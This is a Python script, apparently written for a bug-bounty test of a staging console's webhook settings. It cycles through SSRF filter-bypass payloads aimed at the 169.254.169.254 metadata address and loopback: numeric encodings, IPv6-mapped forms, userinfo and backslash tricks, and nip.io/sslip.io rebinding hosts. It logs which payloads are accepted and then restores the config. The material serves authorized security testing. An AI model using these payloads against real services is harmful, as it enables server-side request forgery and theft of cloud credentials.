# -*- coding: utf-8 -*-
"""W1b: webhook URL filter bypass matrix - parser differences / DNS tricks / encodings.
Pure PUT probes (no side effects), restore config at the end."""
import json
import ssl
import http.client

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
LOG = r"F:\scan\neon_report\_w1b_out.txt"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]


def out(s):
    print(s, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(s + "\n")


def call(method, path, body=None, timeout=40):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + APIKEY)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, API_BASE + path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


def put(url):
    body = {"enabled": True, "webhook_url": url, "enabled_events": ["user.created"],
            "timeout_seconds": 1}
    return call("PUT", "/projects/%s/branches/%s/auth/webhooks" % (PA, PAMAIN), body)


urls = [
    # control
    ("ctrl-https-ok", "https://example.com/"),
    # decimal / hex / octal encodings of 169.254.169.254 / 127.0.0.1
    ("dec-169254169254", "https://2852039166/"),
    ("hex-a9fea9fe", "https://0xa9fea9fe/"),
    ("octal", "https://0251.0376.0251.0376/"),
    ("dec-127", "https://2130706433/"),
    # ipv6 forms
    ("v6-loop", "https://[::1]/"),
    ("v6-mapped", "https://[::ffff:169.254.169.254]/"),
    ("v6-linklocal", "https://[fe80::1]/"),
    # trailing dot / mixed case / embedded
    ("dot-end", "https://169.254.169.254./"),
    ("userinfo", "https://x@169.254.169.254/"),
    ("double-slash", "https://example.com\\@169.254.169.254/"),
    ("backslash", "https://169.254.169.254\\@example.com/"),
    # dns rebinding style (public dns resolving to private)
    ("nip-linklocal", "https://169.254.169.254.nip.io/"),
    ("nip-localhost", "https://127.0.0.1.nip.io/"),
    ("sslip-1", "https://169.254.169.254.sslip.io/"),
    # port tricks on allowed host (connect to private via alt port is N/A; test port accept)
    ("ok-port", "https://example.com:8443/"),
    ("ok-subdomain", "https://sub.example.com/"),
]
for tag, u in urls:
    st, d = put(u)
    verdict = "PASS(filter bypassed)" if st in (200, 201) else "blocked"
    out("%-16s %-42s -> %d %s %s" % (tag, u, st, verdict, d[:110]))

# restore
body = {"enabled": False, "enabled_events": [], "timeout_seconds": 5}
st, d = call("PUT", "/projects/%s/branches/%s/auth/webhooks" % (PA, PAMAIN), body)
out("restore: %s" % st)
out("== DONE")
